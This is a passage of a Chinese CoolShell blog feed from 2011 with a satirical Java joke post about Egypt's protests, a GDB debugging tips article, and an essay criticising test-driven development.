<h3 class="related_post_title">相关文章</h3>
<ul class="related_post wp_rp">
<li>
<a href="https://coolshell.cn/articles/21589.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/21589.html" class="wp_rp_title">如何做一个有质量的技术分享</a>
</li>
<li>
<a href="https://coolshell.cn/articles/20977.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/20977.html" class="wp_rp_title">程序员如何把控自己的职业</a>
</li>
<li>
<a href="https://coolshell.cn/articles/20765.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/20765.html" class="wp_rp_title">MegaEase的远程工作文化</a>
</li>
<li>
<a href="https://coolshell.cn/articles/20276.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/20276.html" class="wp_rp_title">别让自己“墙”了自己</a>
</li>
<li>
<a href="https://coolshell.cn/articles/19612.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/19612.html" class="wp_rp_title">50年前的登月程序和程序员有多硬核</a>
</li>
<li>
<a href="https://coolshell.cn/articles/19464.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/19464.html" class="wp_rp_title">如何超过大多数人</a>
</li>
</ul>
</div></div>
<div id="post-ratings-3609" class="post-ratings" itemscope itemtype="http://schema.org/Article" data-nonce="da86bfb609">
<img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" > (<strong>31</strong> 人打了分，平均分： <strong>3.97</strong> )<br><span class="post-ratings-text" id="ratings_3609_text"></span><meta itemprop="name" content="那些炒作过度的技术和概念">
<meta itemprop="headline" content="那些炒作过度的技术和概念">
<meta itemprop="description" content="StackExchange.com上有一个贴子在评论着最近20年来被炒作过度的技术，对于出现的结果，大多数赞同，也有一些不赞同。下面我从前15名挑了10个（Java的WORE我去掉了，TDD我也去掉了，因为我觉得他们应该没有炒作过度，而且都不错），按原贴的顺序罗列如下：（后面的一些评论是我加的，欢迎大家讨论）
Top 10 过度炒作的技术和概念

	Unified Modeling Lang...">
<meta itemprop="datePublished" content="2011-01-28T10:00:52+08:00">
<meta itemprop="dateModified" content="2011-02-13T20:03:57+08:00">
<meta itemprop="url" content="https://coolshell.cn/articles/3609.html">
<meta itemprop="author" content="陈皓">
<meta itemprop="mainEntityOfPage" content="https://coolshell.cn/articles/3609.html">
<div style="display: none;" itemprop="publisher" itemscope itemtype="https://schema.org/Organization">
<meta itemprop="name" content="酷 壳 - CoolShell">
<meta itemprop="url" content="https://coolshell.cn">
<div itemprop="logo" itemscope itemtype="https://schema.org/ImageObject"><meta itemprop="url" content=""></div>
</div>
<div style="display: none;" itemprop="aggregateRating" itemscope itemtype="http://schema.org/AggregateRating">
<meta itemprop="bestRating" content="5">
<meta itemprop="worstRating" content="1">
<meta itemprop="ratingValue" content="3.97">
<meta itemprop="ratingCount" content="31">
</div>
</div>
<div id="post-ratings-3609-loading" class="post-ratings-loading">
<img alt="image placeholder" >Loading...</div>
 ]]></content>
<pubDate>2011-01-28T10:00:52+08:00</pubDate>
<guid>https://coolshell.cn/articles/3609.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ Error handling in Egypt ]]></title>
<link>https://coolshell.cn/articles/3630.html</link>
<content><![CDATA[ 
<p>以前发布过《<a href="https://coolshell.cn/articles/551.html" target="_blank">C语言的错误处理</a>》一文，不过今天想说的是Egypt的“错误处理”。埃及的事闹得挺大的，国外和中文twitter上更是炸了锅。不要以为程序员就只会写程序——看看程序员举出来的标语吧。呵呵。</p>
<figure id="attachment_3631" aria-describedby="caption-attachment-3631" style="width: 600px" class="wp-caption aligncenter"><a href="https://coolshell.cn/wp-content/uploads/2011/02/Error-handling-in-Egypt.jpg"><img alt="image placeholder" ></a><figcaption id="caption-attachment-3631" class="wp-caption-text">Error handling in Egypt</figcaption></figure>
<p>当然，作为程序员来说，这段代码显然还需要重构：<br>
<span id="more-3630"></span></p>
<p></p>
<pre data-enlighter-language="java" class="EnlighterJSRAW">try{
    elections(free,fare);
} catch(DemocracyNotFoundException){
    System.err.println("Time for Mubarak to leave");
}</pre>
<p>也有的程序员说，System.err.println不是处理错误的最好方法，正确的方法应该是：</p>
<p></p>
<pre data-enlighter-language="java" class="EnlighterJSRAW">try {
    elections(free,fair);
} catch (DemocracyNotFoundException e) {
    throw new MubarakDepartureParty(e);
}</pre>
<p>最后，我们希望Egypt不要出现：</p>
<p></p>
<pre data-enlighter-language="java" class="EnlighterJSRAW">...
finally {
    Security.shootProtesters();
}</pre>
<p align="center"><img alt="image placeholder" > <img alt="image placeholder" > <br>关注CoolShell微信公众账号和微信小程序</p>
<div style="margin-top: 15px; font-size: 11px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
<div style="text-align:center;padding:0px;font-size: 14px;margin-bottom: 50px;">——=== <b>访问 <a href="https://coolshell.cn/404/" target="_blank">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>
<div class="wp_rp_wrap  wp_rp_vertical_m" id="wp_rp_first"><div class="wp_rp_content">
<h3 class="related_post_title">相关文章</h3>
<ul class="related_post wp_rp">
<li>
<a href="https://coolshell.cn/articles/21589.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/21589.html" class="wp_rp_title">如何做一个有质量的技术分享</a>
</li>
<li>
<a href="https://coolshell.cn/articles/20977.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/20977.html" class="wp_rp_title">程序员如何把控自己的职业</a>
</li>
<li>
<a href="https://coolshell.cn/articles/20765.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/20765.html" class="wp_rp_title">MegaEase的远程工作文化</a>
</li>
<li>
<a href="https://coolshell.cn/articles/20276.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/20276.html" class="wp_rp_title">别让自己“墙”了自己</a>
</li>
<li>
<a href="https://coolshell.cn/articles/19612.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/19612.html" class="wp_rp_title">50年前的登月程序和程序员有多硬核</a>
</li>
<li>
<a href="https://coolshell.cn/articles/19464.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/19464.html" class="wp_rp_title">如何超过大多数人</a>
</li>
</ul>
</div></div>
<div id="post-ratings-3630" class="post-ratings" itemscope itemtype="http://schema.org/Article" data-nonce="3cfe8816df">
<img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" > (<strong>11</strong> 人打了分，平均分： <strong>4.27</strong> )<br><span class="post-ratings-text" id="ratings_3630_text"></span><meta itemprop="name" content="Error handling in Egypt">
<meta itemprop="headline" content="Error handling in Egypt">
<meta itemprop="description" content="以前发布过《C语言的错误处理》一文，不过今天想说的是Egypt的“错误处理”。埃及的事闹得挺大的，国外和中文twitter上更是炸了锅。不要以为程序员就只会写程序——看看程序员举出来的标语吧。呵呵。



当然，作为程序员来说，这段代码显然还需要重构：


[java]try{
    elections(free,fare);
} catch(DemocracyNotFound...">
<meta itemprop="datePublished" content="2011-02-09T08:45:03+08:00">
<meta itemprop="dateModified" content="2011-02-09T22:30:29+08:00">
<meta itemprop="url" content="https://coolshell.cn/articles/3630.html">
<meta itemprop="author" content="陈皓">
<meta itemprop="mainEntityOfPage" content="https://coolshell.cn/articles/3630.html">
<div style="display: none;" itemprop="publisher" itemscope itemtype="https://schema.org/Organization">
<meta itemprop="name" content="酷 壳 - CoolShell">
<meta itemprop="url" content="https://coolshell.cn">
<div itemprop="logo" itemscope itemtype="https://schema.org/ImageObject"><meta itemprop="url" content=""></div>
</div>
<div style="display: none;" itemprop="aggregateRating" itemscope itemtype="http://schema.org/AggregateRating">
<meta itemprop="bestRating" content="5">
<meta itemprop="worstRating" content="1">
<meta itemprop="ratingValue" content="4.27">
<meta itemprop="ratingCount" content="11">
</div>
</div>
<div id="post-ratings-3630-loading" class="post-ratings-loading">
<img alt="image placeholder" >Loading...</div>
 ]]></content>
<pubDate>2011-02-09T08:45:03+08:00</pubDate>
<guid>https://coolshell.cn/articles/3630.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ GDB中应该知道的几个调试方法 ]]></title>
<link>https://coolshell.cn/articles/3643.html</link>
<content><![CDATA[ 
<p>七、八年前写过一篇《<a href="http://blog.csdn.net/haoel/archive/2003/07/02/2879.aspx" target="_blank">用GDB调试程序</a>》，于是，从那以后，很多朋友在MSN上以及给我发邮件询问我关于GDB的问题，一直到今天，还有人在问GDB的相关问题。这么多年来，有一些问题是大家反复在问的，一方面，我觉得我以前的文章可能没有说清楚，另一方面，我觉得大家常问的问题正是最有用的，所以，在这里罗列出来。希望大家补充。</p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#%E4%B8%80%E3%80%81%E5%A4%9A%E7%BA%BF%E7%A8%8B%E8%B0%83%E8%AF%95" title="一、多线程调试">一、多线程调试</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#%E4%BA%8C%E3%80%81%E8%B0%83%E8%AF%95%E5%AE%8F" title="二、调试宏">二、调试宏</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#%E4%B8%89%E3%80%81%E6%BA%90%E6%96%87%E4%BB%B6" title="三、源文件">三、源文件</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#%E5%9B%9B%E3%80%81%E6%9D%A1%E4%BB%B6%E6%96%AD%E7%82%B9" title="四、条件断点">四、条件断点</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-5" href="#%E4%BA%94%E3%80%81%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%8F%82%E6%95%B0" title="五、命令行参数">五、命令行参数</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-6" href="#%E5%85%AD%E3%80%81gdb%E7%9A%84%E5%8F%98%E9%87%8F" title="六、gdb的变量">六、gdb的变量</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-7" href="#%E4%B8%83%E3%80%81x%E5%91%BD%E4%BB%A4" title="七、x命令">七、x命令</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-8" href="#%E5%85%AB%E3%80%81command%E5%91%BD%E4%BB%A4" title="八、command命令">八、command命令</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="%E4%B8%80%E3%80%81%E5%A4%9A%E7%BA%BF%E7%A8%8B%E8%B0%83%E8%AF%95"></span>一、多线程调试<span class="ez-toc-section-end"></span>
</h4>
<p>多线程调试可能是问得最多的。其实，重要就是下面几个命令：</p>
<ul>
<li>info thread 查看当前进程的线程。</li>
<li>thread &lt;ID&gt; 切换调试的线程为指定ID的线程。</li>
<li>break file.c:100 thread all  在file.c文件第100行处为所有经过这里的线程设置断点。</li>
<li>set scheduler-locking off|on|step，这个是问得最多的。在使用step或者continue命令调试当前被调试线程的时候，其他线程也是同时执行的，怎么只让被调试程序执行呢？通过这个命令就可以实现这个需求。
<ul>
<li>off 不锁定任何线程，也就是所有线程都执行，这是默认值。</li>
<li>on 只有当前被调试程序会执行。</li>
<li>step 在单步的时候，除了next过一个函数的情况(熟悉情况的人可能知道，这其实是一个设置断点然后continue的行为)以外，只有当前线程会执行。</li>
</ul>
</li>
</ul>
<h4>
<span class="ez-toc-section" id="%E4%BA%8C%E3%80%81%E8%B0%83%E8%AF%95%E5%AE%8F"></span>二、调试宏<span class="ez-toc-section-end"></span>
</h4>
<p>这个问题超多。在GDB下，我们无法print宏定义，因为宏是预编译的。但是我们还是有办法来调试宏，这个需要GCC的配合。</p>
<p>在GCC编译程序的时候，加上<strong>-ggdb3</strong>参数，这样，你就可以调试宏了。</p>
<p>另外，你可以使用下述的GDB的宏调试命令 来查看相关的宏。</p>
<ul>
<li>info macro – 你可以查看这个宏在哪些文件里被引用了，以及宏定义是什么样的。</li>
<li>macro – 你可以查看宏展开的样子。</li>
</ul>
<p><span id="more-3643"></span></p>
<h4>
<span class="ez-toc-section" id="%E4%B8%89%E3%80%81%E6%BA%90%E6%96%87%E4%BB%B6"></span>三、源文件<span class="ez-toc-section-end"></span>
</h4>
<p>这个问题问的也是很多的，太多的朋友都说找不到源文件。在这里我想提醒大家做下面的检查：</p>
<ol>
<li>编译程序员是否加上了-g参数以包含debug信息。</li>
<li>路径是否设置正确了。使用GDB的directory命令来设置源文件的目录。</li>
</ol>
<p>下面给一个调试/bin/ls的示例（ubuntu下）</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">$ apt-get source coreutils
$ sudo apt-get install coreutils-dbgsym
$ gdb /bin/ls
GNU gdb (GDB) 7.1-ubuntu
(gdb) list main
1192    ls.c: No such file or directory.
in ls.c
(gdb) directory ~/src/coreutils-7.4/src/
Source directories searched: /home/hchen/src/coreutils-7.4:$cdir:$cwd
(gdb) list main
1192        }
1193    }
1194
1195    int
1196    main (int argc, char **argv)
1197    {
1198      int i;
1199      struct pending *thispend;
1200      int n_files;
1201</pre>
<h4>
<span class="ez-toc-section" id="%E5%9B%9B%E3%80%81%E6%9D%A1%E4%BB%B6%E6%96%AD%E7%82%B9"></span>四、条件断点<span class="ez-toc-section-end"></span>
</h4>
<p>条件断点是语法是：break  [where] if [condition]，这种断点真是非常管用。尤其是在一个循环或递归中，或是要监视某个变量。注意，这个设置是在GDB中的，只不过每经过那个断点时GDB会帮你检查一下条件是否满足。</p>
<h4>
<span class="ez-toc-section" id="%E4%BA%94%E3%80%81%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%8F%82%E6%95%B0"></span>五、命令行参数<span class="ez-toc-section-end"></span>
</h4>
<p>有时候，我们需要调试的程序需要有命令行参数，很多朋友都不知道怎么设置调试的程序的命令行参数。其实，有两种方法：</p>
<ol>
<li>gdb命令行的 –args 参数</li>
<li>gdb环境中 set args命令。</li>
</ol>
<h4>
<span class="ez-toc-section" id="%E5%85%AD%E3%80%81gdb%E7%9A%84%E5%8F%98%E9%87%8F"></span>六、gdb的变量<span class="ez-toc-section-end"></span>
</h4>
<p>有时候，在调试程序时，我们不单单只是查看运行时的变量，我们还可以直接设置程序中的变量，以模拟一些很难在测试中出现的情况，比较一些出错，或是switch的分支语句。使用set命令可以修改程序中的变量。</p>
<p>另外，你知道gdb中也可以有变量吗？就像shell一样，gdb中的变量以$开头，比如你想打印一个数组中的个个元素，你可以这样：</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">(gdb) set $i = 0

(gdb) p a[$i++]

...  #然后就一路回车下去了

</pre>
<p>当然，这里只是给一个示例，表示程序的变量和gdb的变量是可以交互的。</p>
<h4>
<span class="ez-toc-section" id="%E4%B8%83%E3%80%81x%E5%91%BD%E4%BB%A4"></span>七、x命令<span class="ez-toc-section-end"></span>
</h4>
<p>也许，你很喜欢用p命令。所以，当你不知道变量名的时候，你可能会手足无措，因为p命令总是需要一个变量名的。x命令是用来查看内存的，在gdb中 “help x” 你可以查看其帮助。</p>
<ul>
<li>x/x 以十六进制输出</li>
<li>x/d 以十进制输出</li>
<li>x/c 以单字符输出</li>
<li>x/i  反汇编 – 通常，我们会使用 <code>x/10i $ip-20 来查看当前的汇编（$ip是指令寄存器）</code>
</li>
<li>x/s 以字符串输出</li>
</ul>
<h4>
<span class="ez-toc-section" id="%E5%85%AB%E3%80%81command%E5%91%BD%E4%BB%A4"></span>八、command命令<span class="ez-toc-section-end"></span>
</h4>
<p>有一些朋友问我如何自动化调试。这里向大家介绍command命令，简单的理解一下，其就是把一组gdb的命令打包，有点像字处理软件的“宏”。下面是一个示例：</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">(gdb) break func
Breakpoint 1 at 0x3475678: file test.c, line 12.
(gdb) command 1
Type commands for when breakpoint 1 is hit, one per line.
End with a line saying just "end".
&gt;print arg1
&gt;print arg2
&gt;print arg3
&gt;end
(gdb)</pre>
<p>当我们的断点到达时，自动执行command中的三个命令，把func的三个参数值打出来。</p>
<p>（全文完）</p>
<p align="center"><img alt="image placeholder" > <img alt="image placeholder" > <br>关注CoolShell微信公众账号和微信小程序</p>
<div style="margin-top: 15px; font-size: 11px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
<div style="text-align:center;padding:0px;font-size: 14px;margin-bottom: 50px;">——=== <b>访问 <a href="https://coolshell.cn/404/" target="_blank">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>
<div class="wp_rp_wrap  wp_rp_vertical_m" id="wp_rp_first"><div class="wp_rp_content">
<h3 class="related_post_title">相关文章</h3>
<ul class="related_post wp_rp">
<li>
<a href="https://coolshell.cn/articles/1525.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/1525.html" class="wp_rp_title">GDB 7.0 发布</a>
</li>
<li>
<a href="https://coolshell.cn/articles/1502.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/1502.html" class="wp_rp_title">高科技：GDB回溯调试</a>
</li>
<li>
<a href="https://coolshell.cn/articles/1042.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/1042.html" class="wp_rp_title">Linux/Unix 新手和专家教程</a>
</li>
<li>
<a href="https://coolshell.cn/articles/6840.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/6840.html" class="wp_rp_title">CSS 布局:40个教程、技巧、例子和最佳实践</a>
</li>
<li>
<a href="https://coolshell.cn/articles/1788.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/1788.html" class="wp_rp_title">程序语言性能比拼</a>
</li>
<li>
<a href="https://coolshell.cn/articles/10249.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/10249.html" class="wp_rp_title">7个示例科普CPU Cache</a>
</li>
</ul>
</div></div>
<div id="post-ratings-3643" class="post-ratings" itemscope itemtype="http://schema.org/Article" data-nonce="2bb3fa6b99">
<img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" > (<strong>18</strong> 人打了分，平均分： <strong>4.39</strong> )<br><span class="post-ratings-text" id="ratings_3643_text"></span><meta itemprop="name" content="GDB中应该知道的几个调试方法">
<meta itemprop="headline" content="GDB中应该知道的几个调试方法">
<meta itemprop="description" content="七、八年前写过一篇《用GDB调试程序》，于是，从那以后，很多朋友在MSN上以及给我发邮件询问我关于GDB的问题，一直到今天，还有人在问GDB的相关问题。这么多年来，有一些问题是大家反复在问的，一方面，我觉得我以前的文章可能没有说清楚，另一方面，我觉得大家常问的问题正是最有用的，所以，在这里罗列出来。希望大家补充。
一、多线程调试
多线程调试可能是问得最多的。其实，重要就是下面几个命令：

...">
<meta itemprop="datePublished" content="2011-02-10T09:34:08+08:00">
<meta itemprop="dateModified" content="2011-02-09T22:28:25+08:00">
<meta itemprop="url" content="https://coolshell.cn/articles/3643.html">
<meta itemprop="author" content="陈皓">
<meta itemprop="mainEntityOfPage" content="https://coolshell.cn/articles/3643.html">
<div style="display: none;" itemprop="publisher" itemscope itemtype="https://schema.org/Organization">
<meta itemprop="name" content="酷 壳 - CoolShell">
<meta itemprop="url" content="https://coolshell.cn">
<div itemprop="logo" itemscope itemtype="https://schema.org/ImageObject"><meta itemprop="url" content=""></div>
</div>
<div style="display: none;" itemprop="aggregateRating" itemscope itemtype="http://schema.org/AggregateRating">
<meta itemprop="bestRating" content="5">
<meta itemprop="worstRating" content="1">
<meta itemprop="ratingValue" content="4.39">
<meta itemprop="ratingCount" content="18">
</div>
</div>
<div id="post-ratings-3643-loading" class="post-ratings-loading">
<img alt="image placeholder" >Loading...</div>
 ]]></content>
<pubDate>2011-02-10T09:34:08+08:00</pubDate>
<guid>https://coolshell.cn/articles/3643.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ TDD并不是看上去的那么美 ]]></title>
<link>https://coolshell.cn/articles/3649.html</link>
<content><![CDATA[ 
<p>春节前的一篇<a title="那些炒作过度的技术和概念" href="https://coolshell.cn/articles/3609.html">那些炒作过度的技术和概念</a>中对敏捷和中国ThoughtWorks的微辞引发了很多争议，也惊动了中国ThoughtWorks公司给我发来了邮件想来找我当面聊聊。对于Agile的Fans们，意料之中地也对我进行了很多质疑和批评。我也回复了许多评论。不过，我的那些回复都是关于中国ThoughtWorks咨询师以及其咨询的方法的。我对Agile方法论中的具体内容评价的不是很多，所以，我想不妨讨论一下Agile方法论中的具体的实践（以前本站也讨论过<a href="https://coolshell.cn/articles/16.html" target="_blank">结对编程的利与弊</a>）。</p>
<p>那么，这次就说说TDD吧，这是ThoughtWorks中国和Agile的Fans们最喜欢的东西了。我在<a href="https://coolshell.cn/articles/3609.html" target="_blank">原来的那篇文章</a>中，我把TDD从过度炒作的技术剔除了出去，因为我还是觉得TDD有些道理的，不过，回顾我的经验，我也并不是很喜欢TDD。我这篇文章是想告诉大家，<strong>TDD并没有看上去的那么美，而且非常难以掌控，并且，这个方法是有悖论之处的</strong>。</p>
<h4>TDD简介</h4>
<p><a href="https://en.wikipedia.org/wiki/Test-driven_development" target="_blank">TDD</a>全称Test Driven Development，是一种软件开发的流程，其由敏捷的“<a href="https://en.wikipedia.org/wiki/Extreme_programming" target="_blank">极限编程</a>”引入。其开发过程是从功能需求的test case开始，先添加一个test case，然后运行所有的test case看看有没有问题，再实现test case所要测试的功能，然后再运行test case，查看是否有case失败，然后重构代码，再重复以上步骤。其理念主要是确保两件事：</p>
<ul>
<li>确保所有的需求都能被照顾到。</li>
<li>在代码不断增加和重构的过程中，可以检查所有的功能是否正确。</li>
</ul>
<p>我不否认TDD的一些有用的地方，如果我们以Test Case 开始，那么，我们就可以立刻知道我们的代码运行的情况是什么样的，这样可以让我们更早地得到我们实现思路的反馈，于是我们更会有信心去重构，去重新设计，从而可以让我们的代码更为正确。</p>
<p>不过，我想提醒的是，<strong>TDD和Unit Test是两码子事儿</strong>。有很多人可能混淆了自动化的Unit Test（如：XUnit系例）和TDD的软件开发过程。另外，可能还会有人向鼓吹“<strong>TDD让你进行自顶向下的设计方式</strong>”，对此，请参阅本站的《<a href="https://coolshell.cn/articles/1654.html" target="_blank">Richard Feynman, 挑战者号, 软件工程</a>》——NASA的挑战者号告诉你自顶向下设计的危险性。</p>
<h4>TDD的困难之处</h4>
<p>下面是几个我认为TDD不容易掌控的地方，甚至就有些不可能（如果有某某TDD的Fans或是ThoughtWorks的咨询师和你鼓吹TDD，你可以问问他们下面这些问题）</p>
<ul>
<li>
<strong>测试范围的确定</strong>。TDD开发流程，一般是先写Test Case。Test Case有很多种，有Functional的，有Unit的，有Integration的……，最难的是Test Case要写成什么样的程度呢。<br>
<span id="more-3649"></span>
<p style="padding-left: 30px;">
</p>
<ul>
<li style="text-align: left;">如果写的太过High Level，那么，当你的Test Case 失败的时候，你不知道哪里出问题了，你得要花很多精力去debug代码。而我们希望的是其能够告诉我是哪个模块出的问题。只有High Level的Test Case，岂不就是Waterfall中的Test环节?</li>
<li style="text-align: left;">如果写的太过Low Level，那么，带来的问题是，你需要花两倍的时间来维护你的代码，一份给test case，一份给实现的功能代码。</li>
<li style="text-align: left;">另外，如果写得太Low Level，根据Agile的迭代开发来说，你的需求是易变的，很多时候，我们的需求都是开发人员自己做的Assumption。所以，你把Test Case 写得越细，将来，一旦需求或Assumption发生变化，你的维护成本也是成级数增加的。</li>
<li style="text-align: left;">当然，如果我把一个功能或模块实现好了，我当然知道Test 的Scope在哪里，我也知道我的Test Case需要写成什么样的程度。但是，<strong>TDD的悖论就在于，你在实现之前先把Test Case就写出来，所以，你怎么能保证你一开始的Test Case是适合于你后面的代码的</strong>？不要忘了，程序员也是在开发的过程中逐渐了解需求和系统的。如果边实现边调整Test Case，为什么不在实现完后再写Test Case呢？如果是这样的话，那就不是TDD了。</li>
</ul>
</li>
</ul>
<ul>
<li>
<strong>关注测试而不是设计</strong>。这可能是TDD的一个弊端，就像《<a title="十条不错的编程观点" href="https://coolshell.cn/articles/2424.html">十条不错的编程观点</a>》中所说的一样——“Unit Test won’t help you write the good code”，在实际的操作过程中，我看到很多程序员为了赶工或是应付工作，<strong>导致其写的代码是为了满足测试的，而忽略了代码质量和实际需求</strong>。有时候，当我们重构代码或是fix bug的时候，甚至导致程序员认为只要所有的Test Case都通过了，代码就是正确的。当然，TDD的粉丝们一定会有下面的辩解：
<p style="padding-left: 30px;">
</p>
<ul>
<li>可以通过结对编程来保证代码质量。</li>
<li>代码一开始就是需要满足功能正确，后面才是重构和调优，而TDD正好让你的重构和优化不会以牺牲功能为代价。</li>
</ul>
</li>
</ul>
<p style="padding-left: 30px;">说的没错，但仅在理论上。操作起来可能会并不会得到期望的结果。1）“结对编程”其并不能保证结对的两个人都不会以满足测试为目的，因为重构或是优化的过程中，一旦程序员看到N多的test cases 都failed了，人是会紧张的，你会不自然地去fix你的代码以让所有的test case都通过。2）另外，我不知道大家怎么编程，我一般的做法是从大局思考一下各种可行的实现方案，对于一些难点需要实际地去编程试试，最后权衡比较，挑选一个最好的方案去实现。而往往着急着去实现某一功能，通常在会导致的是返工，而后面的重构基本上因为前期考虑不足和成为了重写。所以，在实际操作过程中，你会发现，很多时候的重构通常意味着重写，因为那些”非功能性”的需求，你不得不re-design。而re-design往往意味着，你要重写很多Low-Level的Test Cases，搞得你只敢写High Level的Test Case。</p>
<p style="padding-left: 30px;">
</p>
<ul>
<li>
<strong>TDD导致大量的Mock和Stub</strong>。相信我，Test Case并不一定是那么容易的。比如，和其它团队或是系统的接口的对接，或是对实现还不是很清楚的模块，等等。于是你需要在你的代码中做很多的Mock和Stub，甚至fake一些函数来做模拟，很明显，你需要作大量的 assumption。于是，你发现管理和维护这些Mock和Stub也成了一种负担，最要命的是，那不是真正的集成测试，你的Test Case中的Mock很可能是错的，你需要重写他们。</li>
</ul>
<p style="padding-left: 30px;">也许，你会说，就算是不用TDD，在正常的开发过程中，我们的确需要使用Mock和Stub。没错！的确是这样的，不过，记住，我们是在实现代码后来决定什么地方放一个Mock或Stub，而不是在代码实现前干这个事的。</p>
<ul>
<li>
<strong>Test Case并没有想像中的那么简单</strong>。和Waterfall一样，Waterfall的每一个环节都依赖于前面那个环节的正确性，如果我们没有正确的理解需求，那么对于TDD，Test Case和我们的Code都会的错的。所以，TDD中，Test Case是开发中最重要的环节，Test Case的质量的问题会直接导致软件开发的正确和效率。<strong>而TW的咨询师和Agile的Fans们似乎天生就认为，TDD比Waterfall更能准确地了解需求。如果真是这样，用TDD进行需求分析，后面直接Waterfall就OK了</strong>。</li>
</ul>
<p style="padding-left: 30px;">另外，某些Test Case并不一定那么好写，你可能80%的编程时间需要花在某个Test Case的设计和实现上（比如：测试并发），然后，需求一变，你又得重写Test Case。有时候，你会发现写Test Case其实和做实际设计没有差别，你同样要考虑你Test Case的正确性，扩展性，易读性，易维护性，甚至重用性。<strong>如果说我们开发的Test Case是用来保证我们代码实现的正确性，那么，谁又来保证我们的Test Case的正确性呢</strong>？编写Test Case也需要结对或是Code review吗？软件开发有点像长跑，如果把能量花在了前半程，后半程在发力就能难了。</p>
<p>也许，TDD真是过度炒作的，不过，我还真是见过使用TDD开发的不错的项目，只不过那个项目比较简单了。更多的情况下，我看到的是教条式的生硬的TDD，所以，不奇怪地听到了程序员们的抱怨——“自从用了TDD，工作量更大了”。当然，这也不能怪他们，TDD本来就是很难把控的方法。这里送给软件开发管理者们一句话——“<strong>当你的软件开发出现问题的时候，就像bug-fix一样，首要的事是找到root cause，然后再case by case的解决，千万不要因为有问题就要马上换一种新的开发方法</strong>”。相信我，大多数的问题是人和管理者的问题，不是方法的问题。</p>
<p>（<strong>全文完，转载请注明作者和出处，请勿用于商业用途</strong>）</p>
<p align="center"><img alt="image placeholder" > <img alt="image placeholder" > <br>关注CoolShell微信公众账号和微信小程序</p>
<div style="margin-top: 15px; font-size: 11px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
<div style="text-align:center;padding:0px;font-size: 14px;margin-bottom: 50px;">——=== <b>访问 <a href="https://coolshell.cn/404/" target="_blank">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>
<div class="wp_rp_wrap  wp_rp_vertical_m" id="wp_rp_first"><div class="wp_rp_content">
<h3 class="related_post_title">相关文章</h3>
<ul class="related_post wp_rp">
<li>
